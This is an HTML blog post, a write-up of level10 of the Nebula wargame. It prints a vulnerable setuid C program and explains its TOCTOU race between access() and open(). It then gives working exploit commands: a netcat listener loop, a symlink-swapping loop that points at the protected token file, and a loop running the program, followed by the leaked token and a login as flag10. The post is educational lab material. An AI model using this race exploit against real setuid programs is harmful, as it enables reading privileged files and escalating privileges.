@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Nebula level10 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In Level10 we are given a vulnerable piece of code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;errno.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char *file; char *host; if(argc &amp;lt; 3) { printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&amp;quot;Connecting to %s:18211 .">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Nebula level10 write-up">
+    <meta name="twitter:description" content="In Level10 we are given a vulnerable piece of code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;errno.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char *file; char *host; if(argc &amp;lt; 3) { printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&amp;quot;Connecting to %s:18211 .">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Nebula level10 write-up">
+  <meta property="og:description" content="In Level10 we are given a vulnerable piece of code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;errno.h&amp;gt; #include &amp;lt;sys/socket.h&amp;gt; #include &amp;lt;netinet/in.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { char *file; char *host; if(argc &amp;lt; 3) { printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(&amp;quot;Connecting to %s:18211 .">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/11/23/nebula-level10-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/11/23/nebula-level10-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Nebula level10 write-up</h1>
+      <p class="post-meta">@pwntester · Nov 23, 2013 · 4 min read</p>
+    </header>
+    <article class="post-content"><p>In <a href="http://exploit-exercises.com/nebula/level10">Level10</a> we are given a vulnerable piece of code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+ char *file;
+ char *host;
+
+ if(argc &lt; 3) {
+  printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
+  exit(1);
+ }
+
+ file = argv[1];
+ host = argv[2];
+
+ if(access(argv[1], R_OK) == 0) {
+  int fd;
+  int ffd;
+  int rc;
+  struct sockaddr_in sin;
+  char buffer[4096];
+
+  printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);
+
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
+  sin.sin_family = AF_INET;
+  sin.sin_addr.s_addr = inet_addr(host);
+  sin.sin_port = htons(18211);
+
+  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
+   printf(&quot;Unable to connect to host %s\n&quot;, host);
+   exit(EXIT_FAILURE);
+  }
+
+#define HITHERE &quot;.oO Oo.\n&quot;
+  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+   printf(&quot;Unable to write banner to host %s\n&quot;, host);
+   exit(EXIT_FAILURE);
+  }
+#undef HITHERE
+
+  printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);
+
+  ffd = open(file, O_RDONLY);
+  if(ffd == -1) {
+   printf(&quot;Damn. Unable to open file\n&quot;);
+   exit(EXIT_FAILURE);
+  }
+
+  rc = read(ffd, buffer, sizeof(buffer));
+  if(rc == -1) {
+   printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
+   exit(EXIT_FAILURE);
+  }
+
+  write(fd, buffer, rc);
+
+  printf(&quot;wrote file!\n&quot;);
+
+ } else {
+  printf(&quot;You don't have access to %s\n&quot;, file);
+ }
+}
+</code></pre>
+
+<p>There is a clear <strong>TOCTOU</strong> (Time of check, Time of use) vulnerability. The code checks if the file belongs can be accessed by the user calling the application and if so, it sends it over the wire. The problem is that  there is no guarantee that the file that is sent is the same one that was checked with <strong>access()</strong> and we can try to exploit this <strong>race condition</strong> by being faster than the code :D
+In order to do so we will need different moving parts:</p>
+
+<ul>
+<li><p>A listener waiting for the token. We will implement this using <strong>netcat</strong>. We will simply loop <strong>nc</strong> so that it accepts new connections when done with the previous one. We will also output whatever we receive to the <strong>out</strong> file. We will look for our token there:</p>
+
+<pre><code class="language-lang-bash">level10@nebula:~$ while true; do nc -lnp 18211 &gt;&gt; out; done
+</code></pre></li>
+
+<li><p>We will create a fake token file that belongs to us so we can use the <strong>flag10</strong> program to send it to any host. We will place it on /tmp/faketoken and it will contain &ldquo;wrong token, keep trying!&rdquo;:</p>
+
+<pre><code class="language-lang-bash">level10@nebula:~$ echo &quot;wrong token, keep trying!&quot; &gt; /tmp/faketoken
+</code></pre></li>
+
+<li><p>We will start a loop that creates a symbolic link in /home/level10/token pointing to /tmp/faketoken and will alternate it with the real token at /home/flag10/token:</p>
+
+<pre><code class="language-lang-bash">level10@nebula:~$ while true; do ln -fs /tmp/faketoken token; ln -fs /home/flag10/token token; done
+</code></pre></li>
+
+<li><p>All we need to do now is start the <strong>flag10</strong> program:</p>
+
+<pre><code class="language-lang-bash">level10@nebula:~$ while true; do /home/flag10/flag10 /home/level10/token 127.0.0.1; done
+</code></pre></li>
+
+<li><p>Tailing <strong>/home/level10/out</strong> we will see the token appear very quickly:</p>
+
+<pre><code class="language-lang-bash">level10@nebula:~$ tail -f out
+oO Oo.
+wrong token, keep trying!
+.oO Oo.
+wrong token, keep trying!
+.oO Oo.
+wrong token, keep trying!
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+wrong token, keep trying!
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+...
+...
+</code></pre></li>
+
+<li><p>Login as flag10 and get the flag:</p>
+
+<pre><code class="language-lang-bash">alvaro@winterfell ~&gt; ssh flag10@nebula
+
+  _   __     __          __
+ / | / /__  / /_  __  __/ /___ _
+/  |/ / _ \/ __ \/ / / / / __ `/
+/ /|  /  __/ /_/ / /_/ / / /_/ /
+/_/ |_/\___/_.___/\__,_/_/\__,_/
+
+exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of &quot;levelXX&quot; and password &quot;levelXX&quot;, where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+flag10@nebula's password:
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+* Documentation:  https://help.ubuntu.com/
+Your Ubuntu release is not supported anymore.
+For upgrade information, please visit:
+http://www.ubuntu.com/releaseendoflife
+
+New release '12.04.3 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+flag10@nebula:~$ id
+uid=989(flag10) gid=989(flag10) groups=989(flag10)
+flag10@nebula:~$ getflag
+You have successfully executed getflag on a target account
+</code></pre></li>
+</ul>
+
+<p>Voila!!</p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/nebula10"><span class="tag">Nebula10</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2161</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
